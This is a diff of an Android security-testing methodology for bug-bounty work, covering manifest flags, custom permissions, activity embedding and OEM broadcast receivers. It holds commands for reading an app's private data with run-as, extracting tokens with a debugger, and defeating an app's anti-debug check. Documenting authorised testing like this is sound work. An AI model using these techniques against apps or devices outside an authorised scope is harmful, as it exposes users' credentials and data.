-  adb shell am clear-debug-app com.target.app     # reset when done
+  adb shell run-as com.target.app id                                # 'package not debuggable' is the negative
+  # record the flags in inventory/manifest-flags.csv; the run-as private-storage read is D02-029, the JDWP attach is D02-030, testOnly is D02-033
   ```
-- **Proof:** `run-as com.target.app cat databases/*.db` returning the private data on a **stock, non-rooted, non-userdebug** device, and `jdb` printing in-process values (session token, PIN, decrypted balance) at a breakpoint. That "no root required" quality is what moves it out of informational.
+- **Proof:** The `application-debuggable`/`testOnly` badging line and the `dumpsys` flags quoted and recorded in `inventory/manifest-flags.csv`; the payable proof is the owners' — `run-as com.target.app cat databases/*.db` returning the private data on a **stock, non-rooted, non-userdebug** device (D02-029), and `jdb` printing in-process values (session token, PIN, decrypted balance) at a breakpoint (D02-030). That "no root required" quality is what moves it out of informational.
 - **Escalation:** -> D11 (token extraction), D13 (session replay), D12 (Keystore-wrapped material from memory), and a Frida-free instrumentation path for everything else. Note the inverse trick for your own testing: in the debugger, clear `ApplicationInfo.FLAG_DEBUGGABLE` (`flags & ~0x2`) so the app's own self-check sees a non-debuggable process while you stay attached.
 - **Ruled out when:** `aapt2 dump badging` reports no `application-debuggable`, `dumpsys package` flags contain neither `DEBUGGABLE` nor `TEST_ONLY`, and `adb shell run-as com.target.app id` returns `run-as: package not debuggable` on every build channel in scope.
 
@@ -2019,16 +2081,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** From API 31 an app must declare native libraries it loads from outside its own APK. An app that instead `System.load()`s an absolute path outside its APK is loading either a vendor/OEM blob or a file it wrote at runtime — and if that path is writable by anything other than the app's own UID, it is direct native code execution in the app's sandbox.
 - **How:**
   ```bash
-  grep -n 'uses-native-library' merged.xml
+  grep -n 'uses-native-library' "$M"
   adb shell cat /system/etc/public.libraries.txt
   adb shell cat /vendor/etc/public.libraries.txt 2>/dev/null
-  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen' sources/ \
+  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen' $SRC/ \
     | grep -vE 'loadLibrary\("(c|m|log|android|jnigraphics)"'
   # then check the writability of every absolute path found
   adb shell ls -lZ /data/local/tmp/<lib>.so /sdcard/<lib>.so 2>/dev/null
   ```
 - **Proof:** A `System.load("/data/...")` or `System.load("/storage/...")` call site in jadx, plus `ls -lZ` on that path showing it is group- or other-writable, or on external storage. Then plant a library at that path from a second app and show your code running in the target's process.
-- **Escalation:** -> D16 (native review of a non-AOSP library), D17 (if the blob arrives over the network). A `<uses-native-library>` entry is also a direct pointer to OEM-specific native code worth reviewing on its own.
+- **Escalation:** Dynamic owner: D17-013 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D16 (native review of a non-AOSP library), D17 (if the blob arrives over the network). A `<uses-native-library>` entry is also a direct pointer to OEM-specific native code worth reviewing on its own.
 - **Ruled out when:** Every `System.load`/`loadLibrary` call resolves to an APK-internal path (`getApplicationInfo().nativeLibraryDir` or a bare library name), and every declared `<uses-native-library>` names a library under `/system` or `/vendor` that is not writable by any app UID.
 
 ### D03-073 · Framework meta-data keys in the merged manifest — the code-delivery configuration hides here
@@ -2045,7 +2107,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Each cross-platform framework stores security-relevant configuration as `<meta-data>` in the merged manifest. These are routinely missed because they look like build plumbing, and they are the fastest route to a Critical in a cross-platform app.
 - **How:**
   ```bash
-  grep -nE '<meta-data' merged.xml
+  grep -nE '<meta-data' "$M"
   # Expo / expo-updates (from UpdatesConfiguration.kt):
   #   expo.modules.updates.ENABLED
   #   expo.modules.updates.EXPO_UPDATE_URL
@@ -2061,10 +2123,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   #   flutter_deeplinking_enabled
   #   io.flutter.Entrypoint / io.flutter.EntrypointUri / io.flutter.InitialRoute
   # CodePush lives in strings.xml, not the manifest:
-  grep -nE 'CodePushDeploymentKey|CodePushPublicKey|CodePushServerUrl' out/res/values/strings.xml
+  grep -nE 'CodePushDeploymentKey|CodePushPublicKey|CodePushServerUrl' $RES/values/strings.xml
+  # CONSUMER FIRST: build plugins write backend/storage URLs and keys even when the consuming SDK is absent.
+  # Before probing any URL/host/bucket harvested here, prove a consumer exists: the SDK init providers and
+  # registrar <meta-data> in the merged manifest, and the SDK package root in $SRC
+  grep -nE '<provider[^>]*Init(Provider|ializer)|ComponentDiscoveryService|android:value="com\.[a-z0-9.]+\.(ComponentRegistrar|Initializer)"' "$M"
+  ls -d $SRC/com/google/firebase/* $SRC/expo/modules/updates $SRC/com/microsoft/codepush 2>/dev/null
   ```
-- **Proof:** Concrete values — an `EXPO_UPDATE_URL` pointing at a non-TLS or third-party host, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS = true`, a `CodePushServerUrl` you can reach, or `flutter_deeplinking_enabled=true` with no host validation.
-- **Escalation:** -> D17 (OTA code delivery) is where the Critical is argued; -> D09 for the Flutter deep-link routing flag.
+  A key with no registrar and no code root is build-plugin residue — record it as `no consumer` and do not probe it as the app's data plane (it may still be in scope as the vendor's cloud asset: hand it to D18 with that label).
+- **Proof:** Concrete values — an `EXPO_UPDATE_URL` pointing at a non-TLS or third-party host, `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS = true`, a `CodePushServerUrl` you can reach, or `flutter_deeplinking_enabled=true` with no host validation — each with the consumer line (registrar/provider/class root) quoted next to the key.
+- **Escalation:** Dynamic owner: D19-004 / D19-041 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D17 (OTA code delivery) is where the Critical is argued; -> D09 for the Flutter deep-link routing flag.
 - **Ruled out when:** The app ships no OTA framework, or `CODE_SIGNING_CERTIFICATE` is present with `CODE_SIGNING_ALLOW_UNSIGNED_MANIFESTS` absent/false, and the update URL is an HTTPS host under the vendor's control with a verified signature check in the update path.
 
 ### D03-074 · Manifest-derived backend hosts and API versions — the shadow-API bridge
@@ -2076,25 +2144,19 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Attacker** | AM-01 |
 | **Applies to** | any versioned API |
 | **Requires** | backend-api |
-| **Maps to** | Claude-BugHunter `hunt-shadow-api` Stages 1 & 3; the corpus calls this *"the highest-value mobile→backend bridge in the repo"* |
+| **Maps to** | D15-012 (owner of the behavioural diff); the shadow-API bridge pattern (an older mobile-only API version with weaker controls than the current web client's) |
 
 - **Test:** The manifest and its `<meta-data>` / `strings.xml` references are the first place an engagement learns which backend the app talks to — and a mobile app's hardcoded backend calls are frequently an **older API version** than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure. Harvest the hosts here, then diff **behaviourally**, not by response shape.
 - **How:**
   ```bash
-  grep -nE '<meta-data' merged.xml | grep -iE 'url|host|endpoint|api|gateway|base'
-  grep -iE 'name="[^"]*(api|key|secret|token|url|host|endpoint|firebase|sender)[^"]*"' out/res/values/strings.xml
-  grep -rhoE 'https?://[a-zA-Z0-9./?=_%:-]+' out/res/ sources/ | sort -u | grep -v schemas.android.com
+  grep -nE '<meta-data' "$M" | grep -iE 'url|host|endpoint|api|gateway|base'
+  grep -iE 'name="[^"]*(api|key|secret|token|url|host|endpoint|firebase|sender)[^"]*"' $RES/values/strings.xml
+  grep -rhoE 'https?://[a-zA-Z0-9./?=_%:-]+' $RES/ $SRC/ | sort -u | grep -v schemas.android.com | tee -a inventory/hosts.csv
   ```
-  Then the four behavioural diffs, same operation, old path vs current path: **auth strength** (does v1 accept no token / an expired token / a lower-privilege token that v2 rejects?), **rate limiting** (burst both — a missing 429 on v1 means throttling was never backported), **input validation** (same injection / oversized payload to both), **field exposure** (does v1 return internal IDs or PII the current version redacted?).
-  ```bash
-  for v in v1 v2 v3 beta internal legacy old; do
-    curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
-  done
-  curl -s -H "X-API-Version: 1" "https://$TARGET/api/users"
-  ```
-- **Proof:** A security regression on the old path, demonstrated with the **same** request against both versions side by side, with a body-level diff. Watch the layer-ordering trap on the way: a `400 {"field X is required"}` from an unauthenticated request does **not** prove you passed auth — many stacks run a body parser or sanitiser in front of auth middleware. Re-test with a minimal well-formed `{}` before claiming an auth bypass.
-- **Escalation:** -> D15 owns the exploitation; D03's contribution is the host and version inventory. A version difference alone is **Informational** — the weakened control is the finding.
-- **Ruled out when:** Every host and version string the manifest and resources yield resolves to the same API surface the current web client uses, and the four behavioural diffs come back identical (auth rejects identically, both throttle, both validate, both redact).
+  Prove each harvested host has a consumer before handing it on (D03-073: a build-plugin residue key is `no consumer`). This item is the **harvest only**: the four behavioural diffs (auth strength, rate limiting, input validation, field exposure) are run once, in D15-012, against this inventory — do not repeat them here.
+- **Proof:** The host/version inventory written to `inventory/hosts.csv`, each row with its source (meta-data key, `strings.xml` name, or `$SRC` file:line) and its consumer.
+- **Escalation:** -> D15-012 owns the behavioural diff and the exploitation; D03's contribution is the host and version inventory. A version difference alone is **Informational** — the weakened control is the finding.
+- **Ruled out when:** n/a — feeder. The inventory is either written (with its consumers) or the item is incomplete; "no older version exists" is D15-012's negative, not this item's.
 
 ### D03-075 · `REQUEST_INSTALL_PACKAGES` and the update-identity boundary
 
@@ -2104,13 +2166,14 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the attacker-controlled-artefact case |
 | **Attacker** | AM-06 / AM-09 |
 | **Applies to** | all apps with an out-of-Play update path; on `targetSdk >= 26` the installer requires `REQUEST_INSTALL_PACKAGES` — note whether the target declares it |
+| **Requires** | — |
 | **Maps to** | AOSP security-model paper §4.7.1 item (5): *"an update can only be installed if the new APK is signed with the same identity or by an identity that was delegated by the original signer"*; `developer.android.com/training/permissions/requesting-special` |
 
 - **Test:** Confirm the update path genuinely requires signature continuity, and that no side channel — an in-app updater, an OEM installer hook, a `REQUEST_INSTALL_PACKAGES` flow — installs a differently-signed build under the same package name.
 - **How:**
   ```bash
-  grep -n 'REQUEST_INSTALL_PACKAGES' merged.xml
-  grep -rnE 'PackageInstaller\.Session|ACTION_INSTALL_PACKAGE|application/vnd\.android\.package-archive' sources/
+  grep -n 'REQUEST_INSTALL_PACKAGES' "$M"
+  grep -rnE 'PackageInstaller\.Session|ACTION_INSTALL_PACKAGE|application/vnd\.android\.package-archive' $SRC/
   # platform boundary control
   adb install -r resigned.apk     # must fail
   ```
@@ -2126,6 +2189,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | n/a — this is the rule for *choosing* the VRT node |
 | **Attacker** | n/a |
 | **Applies to** | every finding in this chapter |
+| **Requires** | — |
 | **Maps to** | Claude-BugHunter `triage-validation` PRE-SEVERITY GATE, `bugcrowd-reporting` §5 and §8; Bugcrowd's own `broken_access_control.exposed_sensitive_android_intent` node carrying priority **VARIES**, CWE-927 — *"varies"* is the whole game |
 
 - **Test:** Run the pre-severity gate against the **Critical claim**, not against the bug. Substitute your draft title into each question: (1) have I validated the full chain to attacker-attainable impact, or only one primitive in the middle? (2) what does the attacker walk away with, in one concrete sentence? (3) have I reproduced the full chain end to end at least twice? (4) is there an inheritance gate, signature check or audience check still gating the chain — if yes, it is "primitive present" at lower severity, not Critical? (5) has the programme rejected this severity class before?
@@ -2145,6 +2209,88 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Proof:** A documented pass/kill decision per finding, and a report whose first body section is the severity-request paragraph naming the concrete attacker outcome.
 - **Escalation:** -> D27 owns the full reporting discipline: the five-screenshot state-change pattern (pre-state, the bug, negative post-state, positive post-state, the side effect), HAR sanitising, and the PII split — mask session cookies and victim identifiers, **leave visible** trace IDs, your own attacker UID, and JSON key names, because the triager needs those to correlate.
 - **Ruled out when:** n/a. Two standing rules: do **not** retract a confirmed finding that stopped reproducing because the client patched mid-engagement — keep timestamped pre-patch evidence and say so in a retraction appendix; and never select a VRT node that misrepresents the bug to get a higher default severity, because triagers reassign and may flag it. Pick the most specific *accurate* node, then set technical severity manually.
+
+### D03-077 · `allowUntrustedActivityEmbedding` — the target's activity rendered inside an attacker's task split
+
+| | |
+|---|---|
+| **Severity ceiling** | **High** (Critical when the embedded screen authorises a payment, a permission or an installation); P5 as a bare attribute |
+| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) as the pinned node — rate on the action authorised from the embedded state, as D03-061 |
+| **Attacker** | AM-03 — the host app needs no permission and no prompt |
+| **Applies to** | Android 12L (API 32)+ devices; the attribute lives on `<activity>` / `<activity-alias>`; from API 33 the platform honours `knownActivityEmbeddingCerts` as the trusted-host counterpart |
+| **Requires** | exported-activity, api>=32 |
+| **Maps to** | `developer.android.com/guide/topics/large-screens/activity-embedding` (cross-app embedding: `allowUntrustedActivityEmbedding`, `knownActivityEmbeddingCerts`); MASWE-0039; D04-037 owns the host-side PoC |
+| **Record** | logs/D03-077.txt (the grep hits and the embed attempt's logcat); screenshots/D03-077-1.png (the target's activity inside the host split) |
+
+- **Skip when:** `grep -cE 'allowUntrustedActivityEmbedding|knownActivityEmbeddingCerts' "$M"` prints 0 and `adb shell getprop ro.build.version.sdk` < 32 — write `n/a: no activity opts into untrusted embedding (merged manifest, N splits) / device API < 32`.
+- **Test:** `android:allowUntrustedActivityEmbedding="true"` lets **any** installed app embed the activity in its own task as a split pane; `android:knownActivityEmbeddingCerts` restricts embedding to the listed signers. An embedded activity is laid out, sized and surrounded by host-controlled UI, so a consent, payment or permission screen can be shown next to attacker text, shrunk, or partially covered — UI redress with no `SYSTEM_ALERT_WINDOW` and nothing for overlay detection to see.
+- **How:**
+  ```bash
+  grep -nE 'allowUntrustedActivityEmbedding|knownActivityEmbeddingCerts|PROPERTY_ALLOW_UNTRUSTED_ACTIVITY_EMBEDDING' "$M"
+  grep -rnE 'ActivityEmbedding|SplitController|SplitPairRule|isActivityEmbedded|setLaunchActivityEmbedding' $SRC
+  ```
+  Host PoC (differently signed, zero permissions): an `androidx.window` `SplitPairRule` pairing the host's own activity with the target's exported activity; launch the pair, then `adb shell dumpsys activity activities | grep -iE 'TaskFragment|embedded'` and a screenshot of the split.
+- **Proof:** The attribute quoted from `"$M"`, the `dumpsys` line showing the target activity inside the host's TaskFragment, the screenshot of the target's sensitive screen rendered beside host-controlled content, and the action completed from that state.
+- **Escalation:** -> D04-037 (the host-side PoC and the redress argument), D04-048 / D04-049 for the trigger, -> D23 when the embedded screen is a payment confirmation.
+- **Ruled out when:** No activity sets `allowUntrustedActivityEmbedding="true"`, or every activity that does lists `knownActivityEmbeddingCerts` matching only the vendor's own certificates **and** the differently-signed host's embed attempt is refused (the activity opens full-screen in its own task instead — quote the `dumpsys` line).
+
+### D03-078 · SDK-defined custom permission with a constant name — every host app is a definer
+
+| | |
+|---|---|
+| **Severity ceiling** | **High** (Critical when the guarded component issues tokens or writes state); Support for the attribution alone |
+| **VRT** | `broken_access_control.privilege_escalation` (varies) — rate on what the guarded component does |
+| **Attacker** | AM-03 (bundles the same SDK and is installed first) / AM-08 (the SDK itself) |
+| **Applies to** | all; most common with analytics, push, payment and messaging AARs that declare `<permission>` in their own manifest |
+| **Requires** | — |
+| **Maps to** | `developer.android.com/privacy-and-security/risks/custom-permissions`; MASWE-0018; D03-001 (merger-report attribution), D03-013 (the squatting race this item does **not** need) |
+| **Record** | logs/D03-078.txt (`sdk-defined.txt`, the guarded components per string, `pm list permissions -f` output); pocs/F-NNN/ when the PoC host reaches the component |
+
+- **Skip when:** `grep -oE '<permission[^>]+android:name="[^"]+"' "$M" | grep -vc "$PKG\."` prints 0 — write `n/a: every <permission> the merged manifest defines is scoped to the app's own package`.
+- **Test:** A permission injected by an AAR whose `android:name` does **not** contain the host's applicationId is shared across every app that bundles the SDK. Android keeps the first installer's definition and level; every later host's components guarded by that string are reachable by whoever holds it — and any app bundling the SDK requests and holds it legitimately. No typo, no race, no uninstall: the attacker simply ships the same SDK and installs first.
+- **How:**
+  ```bash
+  # defined names that are NOT scoped to this app's package
+  PKG=$(grep -oE 'package="[^"]+"' "$M" | head -1 | cut -d'"' -f2)
+  grep -oE '<permission[^>]+android:name="[^"]+"' "$M" | grep -oE 'android:name="[^"]+"' | cut -d'"' -f2 | grep -v "^$PKG\." > sdk-defined.txt
+  # which components does each guard, and which AAR injected it (D03-001 merger report, or the SDK package root in $SRC)
+  while read -r s; do echo "== $s"; grep -nE "android:(permission|readPermission|writePermission)=\"$s\"" "$M"; done < sdk-defined.txt
+  adb shell pm list permissions -f > pm-perms.txt; grep -B1 -A3 -f sdk-defined.txt pm-perms.txt   # who is the definer on THIS device, and at what level?
+  echo "sdk-defined: $(wc -l < sdk-defined.txt)"   # count it (D03-007)
+  ```
+  PoC: a zero-permission app that bundles the same SDK (or simply declares the same `<permission>` at the same level plus `<uses-permission>`), installed **before** the target on a clean device; then drive the guarded component from it (D03-006).
+- **Proof:** `pm list permissions -f` naming a package other than the target (another SDK host, or your PoC) as the definer, plus the PoC — holding the permission through its own `<uses-permission>` — reaching the guarded component and producing its side effect.
+- **Escalation:** -> D18 (SDK supply chain: one fix in the SDK closes it for every host), D05 / D06 / D07 by the component type behind the string; the consumer is filed per D03-076.
+- **Ruled out when:** Every `<permission>` the app defines is scoped to its own package (or was written with `${applicationId}` and expanded correctly — see D03-011), or the non-scoped ones are `signature`-level **and** a PoC bundling the SDK under a different signing key is refused (`Permission Denial` captured), on a device where the PoC was installed first.
+
+### D03-079 · OEM and preloaded receivers for actions nobody declared `<protected-broadcast>`
+
+| | |
+|---|---|
+| **Severity ceiling** | **High** |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — rate on the receiver's side effect |
+| **Attacker** | AM-03 |
+| **Applies to** | preloaded / OEM / carrier packages only; any API level |
+| **Requires** | oem-scope, exported-receiver |
+| **Maps to** | AOSP `frameworks/base/core/res/AndroidManifest.xml` (`<protected-broadcast>` list); MASTG-TEST-0366; D03-066 (privileged-permission audit of the same packages) |
+| **Record** | logs/D03-079.txt (`protected.txt`, the `UNPROTECTED` list, the probe transcripts) |
+
+- **Skip when:** `jq -r '.authorisation.scope' "$E/engagement.json"` does not include the preloaded surface, or the package is not on the system image (`adb shell pm list packages -s | grep -c "$PKG"` prints 0) — write `n/a: no preloaded package in scope`.
+- **Test:** Only actions declared `<protected-broadcast>` by a system-signed package are restricted to system senders. An OEM receiver filtering on `com.oem.action.*`, or on a vendor variant of a platform action that no package protects, can be fed that action by any installed app — and OEM receivers routinely do things (reset, provision, toggle radios, write settings) that the platform's own receivers guard with signature permissions.
+- **How:**
+  ```bash
+  # the device's protected-broadcast set (one dump), then every action the package's receivers filter on
+  adb shell dumpsys package > dumpsys-all.txt
+  sed -n '/Protected broadcast actions:/,/^$/p' dumpsys-all.txt | awk '{print $1}' | grep -v ':' > protected.txt
+  # alternative source: aapt2 d xmltree framework-res.apk --file AndroidManifest.xml | grep -A1 protected-broadcast
+  for a in $(grep -oE '<action android:name="[^"]+"' "$M" | cut -d'"' -f2 | grep -vE '^android\.intent\.action\.(MAIN|VIEW)$' | sort -u); do grep -qx "$a" protected.txt || echo "UNPROTECTED $a"; done | tee unprotected.txt
+  echo "unprotected: $(wc -l < unprotected.txt)"   # count it (D03-007)
+  # send each UNPROTECTED action from the zero-permission probe's broadcast step (explicit and implicit)
+  adb shell am start -S -a probe.fire.1 -n com.sanehunters.probe/.MainActivity --es run broadcast --es victim "$PKG" --es action "<UNPROTECTED action>" --ez ordered true
+  ```
+- **Proof:** The receiver's side effect (a settings delta, a logcat line from its handler, an ordered-broadcast result code other than the default) on a broadcast sent from `untrusted_app` for an action absent from `protected.txt`, with the `dumpsys` row of the receiver quoted.
+- **Escalation:** -> D05 (the payload and the broadcast-injection argument), D25 (OEM impact and the privileged holder), D03-066 when the receiver's handler uses a privileged permission on the caller's behalf.
+- **Ruled out when:** Every action the package's receivers filter on appears in the device's protected-broadcast list, or the receiver carries a `signature`-level permission resolved per D03-005 — confirmed by the probe's broadcast producing `Permission Denial` / no handler run for every `UNPROTECTED` candidate.
 
 ## Graveyard for this domain
 
